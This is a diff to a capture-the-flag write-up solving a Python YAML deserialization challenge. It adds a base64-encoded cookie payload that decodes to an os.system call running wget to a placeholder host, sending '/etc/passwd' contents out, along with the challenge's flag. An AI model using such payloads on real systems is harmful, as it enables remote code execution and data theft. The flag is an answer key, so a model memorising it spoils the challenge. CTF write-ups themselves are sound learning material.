@@ -23,6 +23,11 @@ but there is a problem the flag is in `/etc/passwd` and this payload doesn't acc
 so a friend gave me a link `https://xerosecurity.com/wordpress/exploiting-python-deserialization-vulnerabilities/`.
 
 ## Solution
-Run a web server with `python3 -m http.server`.
+I tried a python web server didin't work for me so i tried
+`https://requestbin.com/r`
 
-Payload: `Imdvb2RieWUiOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6b3Muc3lzdGVtIFsid2dldCBodHRwczovL3lvdXItd2ViLXNlcnZlci8/JTYwY2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAnRidgIl0K` (decode it to know the answer and put your data and decode it again and input it as a cookie)
+Payload: `Imdvb2RieWUiOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6b3Muc3lzdGVtIFsid2dldCBodHRwOi8veW91ci13ZWItc2VydmVyLz9gY2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAneydgIl0=` (decode it to know the answer and put your data and decode it again and input it as a cookie)
+
+Flag:`FLAG{aa330d7755f14d398cbfef715bbf36f59a8cfae5}`
+
+Credits to "ItsFadinG" for helping me, and to the creator of the challenge.
